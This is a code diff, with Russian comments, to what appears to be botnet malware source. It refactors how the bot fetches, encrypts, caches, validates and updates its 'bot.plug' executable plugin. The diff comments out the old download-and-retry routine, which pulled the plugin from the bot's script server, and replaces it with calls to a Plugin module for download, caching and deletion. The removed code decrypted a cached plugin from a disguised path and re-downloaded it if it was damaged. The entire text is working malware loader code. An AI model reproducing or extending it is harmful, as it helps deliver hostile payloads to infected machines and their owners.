@@ -14,6 +14,7 @@
 #include "BotUtils.h"
 #include "BotCore.h"
 #include "Crypt.h"
+#include "Plugins.h"
 #include "MD5.h"
 
 //---------------------------------------------------------------------------
@@ -150,29 +151,18 @@ BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
 
 
 //----------------------------------------------
-//  GetBotPlugFileName - Функция возвращает имя
-//  файла, для хранения плагина
-//----------------------------------------------
-string GetBotPlugFileName()
-{
-	string Path = BOT::MakeWorkPath();
-	PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrBotPlug).t_str(), false);
-	Path += Name;
-	STR::Free(Name);
-    return Path;
-}
-
-
-//----------------------------------------------
 //  DownloadBotPlug - Функци загружает плагин
 //  бота
 //----------------------------------------------
-bool DoDownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
+/*
+bool DoDownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
 {
 	// Скачивание плагина bot.plug организовываем вне
 	// системы загрузки плагинов
 	if (Buf)     *Buf = NULL;
 	if (BufSize) *BufSize = 0;
+
+	string PluginName = GetStr(EStrBotPlug);
 
 	PCHAR URL = GetBotScriptURL(SCRIPT_PLUGIN);
 	if (STRA::IsEmpty(URL)) return false;
@@ -186,7 +176,7 @@ bool DoDownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
 	HTTP.CheckOkCode = false;
 
 	TBotStrings Fields;
-	Fields.AddValue("name", GetStr(EStrBotPlug));
+	Fields.AddValue("name", PluginName.t_str());
 
 	// Плучаем адрес плагина
 	bool Result = false;
@@ -212,19 +202,15 @@ bool DoDownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
 
 			if (Result)
 			{
+				// Кэшируем  плагин
+				Plugin::SaveToCache(PluginName.t_str(), Stream.Memory(), Stream.Size());
+
 				// Копиуем файл
 				if (BufSize) *BufSize = Stream.Size();
 				if (Buf)
 				{
 					*Buf = (LPBYTE)MemAlloc(Stream.Size());
 					m_memcpy(*Buf, Stream.Memory(), Stream.Size());
-				}
-
-				// Кэшируем файл
-				if (!FileName.IsEmpty())
-				{
-					CryptBotPlug(Stream.Memory(), Stream.Size());
-					File::WriteBufferA(FileName.t_str(), Stream.Memory(), Stream.Size());
 				}
             }
 		}
@@ -235,16 +221,16 @@ bool DoDownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
 }
 
 
-bool DownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
+bool DownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
 {
 	bool Result = false;
 	while (!Result)
 	{
-		Result = DoDownloadBotPlug(FileName, Buf, BufSize);
+		Result = DoDownloadBotPlug(Buf, BufSize);
 		if (!Result) pSleep(30000);
 	}
 	return Result;
-}
+}    */
 
 
 
@@ -261,8 +247,6 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 	if (BufSize) *BufSize = 0;
 
 	if (!Buf) return FALSE;
-	*Buf = NULL;
-
 
 #ifdef DEBUGCONFIG
 	// Заглушка на время тестов
@@ -273,50 +257,11 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 */
 #endif
 
+	*Buf = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, BufSize,
+	                          true, true, NULL);
 
 
-
-
-	// Пытаемся загрузить плагин из файла
-	string FileName = GetBotPlugFileName();
-
-	DWORD  FileSize = 0;
-	LPBYTE FileData = File::ReadToBufferA(FileName.t_str(), FileSize);
-	if (FileData)
-	{
-		// Файл есть на диске, дешифруем буфер и возвращаем значение
-
-		// Расшифровываем ботплаг
-		CryptBotPlug(FileData, FileSize);
-
-		// Проверяем результат
-		BOOL Valid = IsExecutableFile(FileData);
-
-		if (Valid)
-		{
-			// Всё удачно расшифровано, возвращаем результат
-			*Buf = FileData;
-			if (BufSize) *BufSize = FileSize;
-			return TRUE;
-		}
-		else
-		{
-			// Буфер повреждён, удаляем файл
-			MemFree(FileData);
-			pDeleteFileA(FileName.t_str());
-        }
-	}
-
-
-	// Загружаем плагин
-	if (!DownloadBotPlug(FileName, &FileData, &FileSize))
-		return FALSE;
-
-	// Возвращаем результат
-	*Buf = FileData;
-	if (BufSize) *BufSize = FileSize;
-
-	return TRUE;
+	return *Buf != NULL;
 }
 
 
@@ -326,17 +271,9 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 //  DeleteBotPlug
 //  Функция обновляет плагин
 //----------------------------------------------
-
-BOOL DoDeleteBotPlug(const string& FileName)
-{
-	return (BOOL)pDeleteFileA(FileName.t_str());
-}
-
-
 BOOL WINAPI DeleteBotPlug()
 {
-	string FileName = GetBotPlugFileName();
-	return DoDeleteBotPlug(FileName);
+	return Plugin::DeleteFromCache(GetStr(EStrBotPlug).t_str());
 }
 
 //----------------------------------------------
@@ -344,9 +281,12 @@ BOOL WINAPI DeleteBotPlug()
 //----------------------------------------------
 BOOL WINAPI UpdateBotPlug()
 {
-	string FileName = GetBotPlugFileName();
-	DoDeleteBotPlug(FileName);
-	return DownloadBotPlug(FileName, NULL, NULL);
+	DeleteBotPlug();
+	LPVOID Buf;
+	LoadBotPlug(&Buf, NULL);
+	BOOL Result = Buf != NULL;
+	MemFree(Buf);
+	return Result;
 }
 
 
